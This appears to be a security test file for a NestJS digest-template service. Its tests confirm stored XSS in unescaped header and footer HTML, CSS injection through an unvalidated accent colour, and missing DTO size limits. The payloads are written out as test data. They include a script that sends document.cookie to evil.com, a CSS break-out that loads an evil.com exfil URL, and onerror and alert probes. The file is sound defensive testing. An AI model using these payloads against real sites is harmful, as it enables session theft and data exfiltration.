/**
 * ADVERSARIAL TESTS: Digest Templates
 *
 * SEC-053: Stored XSS via headerHtml/footerHtml — raw HTML injected into preview
 * SEC-054: CSS injection via unvalidated accentColor
 * SEC-055: No @MaxLength or @ArrayMaxSize on multiple DTO fields
 */

import { describe, it, expect, vi } from 'vitest';
import { Test } from '@nestjs/testing';
import { DigestTemplateService } from './digest-template.service';
import { PrismaService } from '../prisma/prisma.service';
import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { CreateDigestTemplateDto } from './dto/create-digest-template.dto';

function buildMockPrisma() {
  return {
    digestTemplate: {
      create: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      update: vi.fn(),
      updateMany: vi.fn(),
      delete: vi.fn(),
    },
    $transaction: vi.fn(),
  };
}

describe('[SEC-053] stored XSS in digest template preview', () => {
  it('headerHtml is rendered unescaped in renderPreview output', async () => {
    const prisma = buildMockPrisma();
    const module = await Test.createTestingModule({
      providers: [
        DigestTemplateService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();
    const service = module.get<DigestTemplateService>(DigestTemplateService);

    const xssPayload = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>';

    prisma.digestTemplate.findUnique.mockResolvedValue({
      id: 't1',
      name: 'XSS Template',
      subject: 'Test',
      headerHtml: xssPayload,
      footerHtml: '',
      sections: [],
      accentColor: '#c5a880',
      logoUrl: null,
      isActive: false,
    });

    const html = await service.renderPreview('t1');

    // SEC-053: The script tag appears raw in the HTML — not escaped
    expect(html).toContain(xssPayload);
    // logoUrl IS escaped via escapeHtml(), but headerHtml is not
  });

  it('footerHtml is also rendered unescaped', async () => {
    const prisma = buildMockPrisma();
    const module = await Test.createTestingModule({
      providers: [
        DigestTemplateService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();
    const service = module.get<DigestTemplateService>(DigestTemplateService);

    const xssPayload = '<img src=x onerror="alert(1)">';

    prisma.digestTemplate.findUnique.mockResolvedValue({
      id: 't1',
      name: 'Template',
      subject: 'Test',
      headerHtml: '',
      footerHtml: xssPayload,
      sections: [],
      accentColor: '#c5a880',
      logoUrl: null,
      isActive: false,
    });

    const html = await service.renderPreview('t1');
    expect(html).toContain(xssPayload);
  });
});

describe('[SEC-054] CSS injection via accentColor', () => {
  it('accentColor is interpolated directly into style attributes', async () => {
    const prisma = buildMockPrisma();
    const module = await Test.createTestingModule({
      providers: [
        DigestTemplateService,
        { provide: PrismaService, useValue: prisma },
      ],
    }).compile();
    const service = module.get<DigestTemplateService>(DigestTemplateService);

    // CSS injection: break out of color property into a new property
    const cssInjection = '#000; } body { background-image: url(https://evil.com/exfil)';

    prisma.digestTemplate.findUnique.mockResolvedValue({
      id: 't1',
      name: 'Template',
      subject: 'Test',
      headerHtml: '',
      footerHtml: '',
      sections: ['new_posts'],
      accentColor: cssInjection,
      logoUrl: null,
      isActive: false,
    });

    const html = await service.renderPreview('t1');

    // SEC-054: The injected CSS appears in multiple style attributes
    expect(html).toContain(`color: ${cssInjection}`);
    expect(html).toContain(`background: ${cssInjection}`);
  });
});

describe('[SEC-055] missing DTO constraints', () => {
  it('headerHtml has no @MaxLength — accepts megabyte payloads', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      headerHtml: 'x'.repeat(1_000_000),
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'headerHtml')).toHaveLength(0);
  });

  it('sections has no @ArrayMaxSize — accepts thousands of items', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      sections: Array.from({ length: 10000 }, (_, i) => `section_${i}`),
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'sections')).toHaveLength(0);
  });

  it('accentColor has no format validation — accepts any string', async () => {
    const dto = plainToInstance(CreateDigestTemplateDto, {
      name: 'Test',
      subject: 'Subject',
      accentColor: '<script>alert(1)</script>',
    });

    const errors = await validate(dto);
    expect(errors.filter((e) => e.property === 'accentColor')).toHaveLength(0);
  });
});
